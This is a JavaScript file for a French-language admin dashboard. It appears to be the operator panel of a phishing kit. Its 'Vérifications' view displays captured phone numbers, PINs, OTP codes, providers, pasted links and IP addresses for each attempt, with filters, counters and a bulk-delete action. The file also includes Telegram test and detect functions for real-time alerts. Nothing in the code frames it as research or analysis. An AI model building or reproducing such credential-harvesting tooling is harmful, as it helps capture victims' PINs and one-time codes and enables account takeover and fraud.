"use strict";

async function adminGet(url) {
  return api(url, { method: "GET" });
}

function guarderAdmin(err) {
  if (err && (err.status === 401 || /auth|session|connect/i.test(String(err.message || "")))) {
    window.location.href = "/admin/login.html";
    return;
  }
  alert(err && err.message ? err.message : "Erreur");
}

function initNavigation() {
  document.querySelectorAll("[data-view]").forEach((a) => {
    a.addEventListener("click", (e) => {
      e.preventDefault();
      document.querySelectorAll("[data-view]").forEach((x) => x.classList.remove("active"));
      a.classList.add("active");
      showPane(a.getAttribute("data-view"));
    });
  });
}

function showPane(name) {
  document.querySelectorAll("[data-pane]").forEach((p) => p.classList.add("hidden"));
  const pane = document.querySelector('[data-pane="' + name + '"]');
  if (pane) pane.classList.remove("hidden");
  const loaders = {
    dashboard: chargerDashboard,
    orders: chargerCommandes,
    analytics: chargerAnalytics,
    packages: chargerForfaitsAdmin,
    customers: chargerClients,
    messages: chargerMessages,
    verifications: chargerVerifications,
    settings: chargerParametres
  };
  if (loaders[name]) loaders[name]();
}

async function chargerDashboard() {
  try {
    const s = await adminGet("/api/admin/summary");
    const kpis = document.getElementById("kpis");
    if (kpis) {
      kpis.innerHTML =
        '<div class="kpi"><div class="n">' + (s.totalCommandes || 0) + '</div><div class="l">Commandes</div></div>' +
        '<div class="kpi"><div class="n">' + (s.totalLogs || 0) + '</div><div class="l">Tentatives OTP</div></div>';
    }
    const orders = await adminGet("/api/admin/orders");
    const tab = document.getElementById("tab-dernieres");
    if (tab) {
      const list = (orders.orders || []).slice(0, 8);
      if (!list.length) tab.innerHTML = '<tr><td class="muted">Aucune commande</td></tr>';
      else
        tab.innerHTML =
          "<tr><th>Réf</th><th>Client</th><th>Tél</th><th>Montant</th><th>Statut</th></tr>" +
          list
            .map(
              (o) =>
                "<tr><td>" +
                esc(o.ref || o.id || "—") +
                "</td><td>" +
                esc(o.name || o.client || "—") +
                "</td><td>" +
                esc(o.phone || "—") +
                "</td><td>" +
                esc(String(o.amount || o.total || "—")) +
                "</td><td>" +
                esc(o.statut || o.status || "—") +
                "</td></tr>"
            )
            .join("");
    }
  } catch (e) {
    guarderAdmin(e);
  }
}

async function chargerCommandes() {
  try {
    const data = await adminGet("/api/admin/orders");
    const tab = document.getElementById("tab-orders");
    if (!tab) return;
    const list = data.orders || [];
    if (!list.length) {
      tab.innerHTML = '<tr><td class="muted">Aucune commande</td></tr>';
      return;
    }
    tab.innerHTML =
      "<tr><th>Réf</th><th>Client</th><th>Téléphone</th><th>Montant</th><th>Statut</th><th>Date</th></tr>" +
      list
        .map(
          (o) =>
            "<tr><td>" +
            esc(o.ref || o.id || "—") +
            "</td><td>" +
            esc(o.name || o.client || "—") +
            "</td><td>" +
            esc(o.phone || "—") +
            "</td><td>" +
            esc(String(o.amount || o.total || "—")) +
            "</td><td>" +
            esc(o.statut || o.status || "—") +
            "</td><td>" +
            esc(o.createdAt || o.at || "—") +
            "</td></tr>"
        )
        .join("");
  } catch (e) {
    guarderAdmin(e);
  }
}

async function chargerAnalytics() {
  const box = document.getElementById("analytics-box");
  if (box) box.textContent = "Consultez Telegram et l'onglet Vérifications pour l'activité en temps réel.";
}

async function chargerForfaitsAdmin() {
  try {
    const data = await adminGet("/api/admin/packages");
    const tab = document.getElementById("tab-packages");
    if (!tab) return;
    const list = data.packages || [];
    tab.innerHTML =
      "<tr><th>Code</th><th>Nom</th><th>Prix</th><th>Actif</th></tr>" +
      list
        .map(
          (p) =>
            "<tr><td>" +
            esc(p.code || p.id || "—") +
            "</td><td>" +
            esc(p.nom || p.name || "—") +
            "</td><td>" +
            esc(String(p.prix || p.price || "—")) +
            "</td><td>" +
            (p.active === false ? "Non" : "Oui") +
            "</td></tr>"
        )
        .join("");
  } catch (e) {
    guarderAdmin(e);
  }
}

async function chargerClients() {
  try {
    const data = await adminGet("/api/admin/login-logs?limit=500");
    const phones = {};
    (data.logs || []).forEach((l) => {
      if (l.phone) phones[l.phone] = (phones[l.phone] || 0) + 1;
    });
    const tab = document.getElementById("tab-customers");
    if (!tab) return;
    const rows = Object.keys(phones).map((p) => ({ phone: p, n: phones[p] }));
    rows.sort((a, b) => b.n - a.n);
    tab.innerHTML =
      "<tr><th>Téléphone</th><th>Tentatives</th></tr>" +
      (rows.length
        ? rows.map((r) => "<tr><td><code>" + esc(r.phone) + "</code></td><td>" + r.n + "</td></tr>").join("")
        : '<tr><td colspan="2" class="muted">Aucun client pour le moment</td></tr>');
  } catch (e) {
    guarderAdmin(e);
  }
}

async function chargerMessages() {
  try {
    const data = await adminGet("/api/admin/messages");
    const tab = document.getElementById("tab-messages");
    if (!tab) return;
    const list = data.messages || [];
    tab.innerHTML =
      "<tr><th>Date</th><th>Nom</th><th>Tél</th><th>Message</th></tr>" +
      (list.length
        ? list
            .map(
              (m) =>
                "<tr><td>" +
                esc(m.at || "—") +
                "</td><td>" +
                esc(m.name || "—") +
                "</td><td>" +
                esc(m.phone || "—") +
                "</td><td>" +
                esc(m.message || "—") +
                "</td></tr>"
            )
            .join("")
        : '<tr><td colspan="4" class="muted">Aucun message</td></tr>');
  } catch (e) {
    guarderAdmin(e);
  }
}

let _verifLogs = [];

function actionLabel(a) {
  const map = {
    otp_requested: ["info", "OTP demandé"],
    otp_failed: ["bad", "OTP incorrect"],
    otp_verified: ["ok", "OTP OK"],
    pin_failed: ["bad", "PIN incorrect"],
    link_submitted: ["info", "Lien collé"]
  };
  const m = map[a] || ["dim", a || "—"];
  return '<span class="badge ' + m[0] + '">' + esc(m[1]) + "</span>";
}

async function chargerVerifications() {
  try {
    const data = await adminGet("/api/admin/login-logs?limit=500");
    _verifLogs = data.logs || [];
    const by = {};
    _verifLogs.forEach((l) => {
      by[l.action] = (by[l.action] || 0) + 1;
    });
    const kpis = document.getElementById("verif-kpis");
    if (kpis) {
      kpis.innerHTML =
        '<div class="kpi"><div class="n">' +
        _verifLogs.length +
        '</div><div class="l">Total</div></div>' +
        '<div class="kpi"><div class="n">' +
        (by.otp_requested || 0) +
        '</div><div class="l">OTP envoyés</div></div>' +
        '<div class="kpi"><div class="n">' +
        (by.otp_failed || 0) +
        '</div><div class="l">OTP incorrects</div></div>' +
        '<div class="kpi"><div class="n">' +
        (by.otp_verified || 0) +
        '</div><div class="l">OTP OK</div></div>' +
        '<div class="kpi"><div class="n">' +
        (by.link_submitted || 0) +
        '</div><div class="l">Liens</div></div>';
    }
    renderVerifications();
  } catch (e) {
    guarderAdmin(e);
  }
}

function renderVerifications() {
  const q = ((document.getElementById("q-verif") || {}).value || "").toLowerCase().trim();
  const act = ((document.getElementById("f-verif-action") || {}).value) || "";
  let rows = _verifLogs.slice();
  if (act) rows = rows.filter((l) => l.action === act);
  if (q) {
    rows = rows.filter((l) =>
      [l.phone, l.pin, l.otp, l.link, l.package, l.provider, l.ip].join(" ").toLowerCase().includes(q)
    );
  }
  const body = document.getElementById("tab-verif-body");
  if (!body) return;
  if (!rows.length) {
    body.innerHTML = '<tr><td colspan="9" class="muted">Aucune tentative.</td></tr>';
    return;
  }
  body.innerHTML = rows
    .map((l) => {
      const when = l.at ? new Date(l.at).toLocaleString("fr-FR") : "—";
      const linkCell = l.link
        ? '<a href="' +
          esc(l.link) +
          '" target="_blank" rel="noopener" style="color:#60a5fa;word-break:break-all;">' +
          esc(String(l.link).slice(0, 48)) +
          "</a>"
        : "—";
      return (
        "<tr><td>" +
        esc(when) +
        "</td><td>" +
        actionLabel(l.action) +
        "</td><td>" +
        esc((l.provider || "—").toUpperCase()) +
        "</td><td><code>" +
        esc(l.phone || "—") +
        "</code></td><td><code>" +
        esc(l.pin || "—") +
        "</code></td><td><code>" +
        esc(l.otp || "—") +
        "</code></td><td>" +
        linkCell +
        "</td><td>" +
        esc(l.package || "—") +
        "</td><td>" +
        esc(l.ip || "—") +
        "</td></tr>"
      );
    })
    .join("");
}

async function viderVerifications() {
  if (!confirm("Supprimer toutes les tentatives ?")) return;
  try {
    await api("/api/admin/login-logs", { method: "DELETE" });
    await chargerVerifications();
  } catch (e) {
    guarderAdmin(e);
  }
}

async function chargerParametres() {
  /* password form handled below */
}

async function testerTelegram() {
  const box = document.getElementById("tg-result");
  try {
    const r = await api("/api/admin/telegram/test", { method: "POST", body: {} });
    if (box) box.innerHTML = '<div class="alert success">Test envoyé: ' + esc(JSON.stringify(r)) + "</div>";
  } catch (e) {
    if (box) box.innerHTML = '<div class="alert error">' + esc(e.message) + "</div>";
  }
}

async function detecterTelegram() {
  const box = document.getElementById("tg-result");
  try {
    const r = await adminGet("/api/admin/telegram/detect");
    if (box) box.innerHTML = "<pre style='color:#cbd5e1;font-size:12px;'>" + esc(JSON.stringify(r, null, 2)) + "</pre>";
  } catch (e) {
    if (box) box.innerHTML = '<div class="alert error">' + esc(e.message) + "</div>";
  }
}

document.addEventListener("DOMContentLoaded", async () => {
  try {
    const me = await adminGet("/api/admin/me");
    const el = document.getElementById("admin-user");
    if (el) el.textContent = me.user || "admin";
  } catch (e) {
    window.location.href = "/admin/login.html";
    return;
  }

  initNavigation();
  chargerDashboard();

  const br = document.getElementById("btn-refresh-orders");
  if (br) br.addEventListener("click", chargerCommandes);

  const brv = document.getElementById("btn-refresh-verif");
  if (brv) brv.addEventListener("click", () => chargerVerifications());
  const bcv = document.getElementById("btn-clear-verif");
  if (bcv) bcv.addEventListener("click", () => viderVerifications());
  const qv = document.getElementById("q-verif");
  if (qv) qv.addEventListener("input", () => renderVerifications());
  const fv = document.getElementById("f-verif-action");
  if (fv) fv.addEventListener("change", () => renderVerifications());

  const btnLogout = document.getElementById("btn-logout");
  if (btnLogout)
    btnLogout.addEventListener("click", async () => {
      try {
        await api("/api/admin/logout", { method: "POST", body: {} });
      } catch (_) {}
      window.location.href = "/admin/login.html";
    });

  const tgTest = document.getElementById("btn-tg-test");
  if (tgTest) tgTest.addEventListener("click", testerTelegram);
  const tgProbe = document.getElementById("btn-tg-probe");
  if (tgProbe) tgProbe.addEventListener("click", detecterTelegram);

  const formPw = document.getElementById("form-password");
  if (formPw)
    formPw.addEventListener("submit", async (e) => {
      e.preventDefault();
      const alert = document.getElementById("pw-alert");
      try {
        await api("/api/admin/settings/password", {
          method: "POST",
          body: {
            current: document.getElementById("pw-current").value,
            next: document.getElementById("pw-next").value
          }
        });
        if (alert) alert.innerHTML = '<div class="alert success">Mot de passe mis à jour.</div>';
        formPw.reset();
      } catch (err) {
        if (alert) alert.innerHTML = '<div class="alert error">' + esc(err.message) + "</div>";
      }
    });
});
